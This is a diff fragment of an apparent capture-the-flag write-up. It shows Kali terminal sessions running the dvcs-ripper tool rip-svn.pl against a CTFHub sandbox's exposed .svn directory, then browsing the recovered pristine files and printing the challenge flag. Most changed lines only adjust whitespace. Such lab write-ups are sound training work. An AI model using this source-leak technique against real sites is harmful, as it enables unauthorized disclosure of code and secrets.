@@ -1002,19 +1002,18 @@ https://github.com/admintony/svnExploit
 └─$ ls
 hg-decode.pl  README.md   rip-cvs.pl  rip-hg.pl
 LICENSE       rip-bzr.pl  rip-git.pl  rip-svn.pl
-                                                                           
+
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
 └─$ ./rip-svn.pl -v -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
 [i] Found new SVN client storage format!
 REP INFO => 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33   
 [i] Trying to revert the tree, if you get error, upgrade your SVN client!   
 已恢复“index.html”                                                          
-                                                                            
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
 └─$ ls
 hg-decode.pl  LICENSE    rip-bzr.pl  rip-git.pl  rip-svn.pl
 index.html    README.md  rip-cvs.pl  rip-hg.pl
-                                                                            
+                                                                         
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
 └─$ ls -la                                  
 总计 104
@@ -1053,18 +1052,17 @@ entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
                                                                             
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
 └─$ cd pristine
-                                                                            
+                                                                    
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
 └─$ ls
-88  bf
-                                                                            
+88  bf                                                                         
 ┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
 └─$ cd 88      
-                                                                            
+
 ┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
 └─$ ls
 88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
-                                                                            
+                                                                    
 ┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
 └─$ cat 88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
 ctfhub{e99d45499cf367688c931aa2}
